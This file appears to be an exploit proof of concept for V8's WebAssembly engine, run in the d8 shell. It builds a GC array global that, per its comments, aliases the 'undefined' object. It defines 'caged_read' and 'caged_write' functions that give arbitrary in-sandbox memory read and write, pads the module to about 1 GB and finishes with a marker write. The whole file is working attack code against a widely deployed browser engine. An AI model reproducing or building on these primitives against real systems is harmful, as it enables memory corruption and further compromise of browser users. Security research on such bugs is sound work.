

/// Flags:

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

///// wasm-module-builder.js END /////

let builder = new WasmModuleBuilder();
let $a0 = builder.addArray(kWasmI32, true);
let $g = builder.addGlobal(wasmRefType($a0), false, false, [...wasmI32Const(0), kGCPrefix, kExprArrayNewDefault, $a0]).exportAs('g');     // undefined

builder.addFunction('caged_read', makeSig([kWasmI32], [kWasmI32])).addBody([
  kExprGlobalGet, $g.index,
  kExprLocalGet, 0,
  ...wasmI32Const(0x74),    // 0x68 (undefined) + 0xc (entry offset)
  kExprI32Sub,
  ...wasmI32Const(2),
  kExprI32ShrU,
  kGCPrefix, kExprArrayGet, $a0,
]).exportFunc();

builder.addFunction('caged_write', makeSig([kWasmI32, kWasmI32], [])).addBody([
  kExprGlobalGet, $g.index,
  kExprLocalGet, 0,
  ...wasmI32Const(0x74),    // 0x68 (undefined) + 0xc (entry offset)
  kExprI32Sub,
  ...wasmI32Const(2),
  kExprI32ShrU,
  kExprLocalGet, 1,
  kGCPrefix, kExprArraySet, $a0,
]).exportFunc();

let buf = builder.toBuffer('pad', 1024*1024*1024-0x10, 0x1f, [kExprGlobalGet, 0, kExprEnd]);
let {module, instance} = await WebAssembly.instantiateStreaming(new Response(buf, {headers: {'content-type': 'application/wasm'}}));
let {func, caged_read, caged_write} = instance.exports;

caged_write(0x4242424, 0x13333337);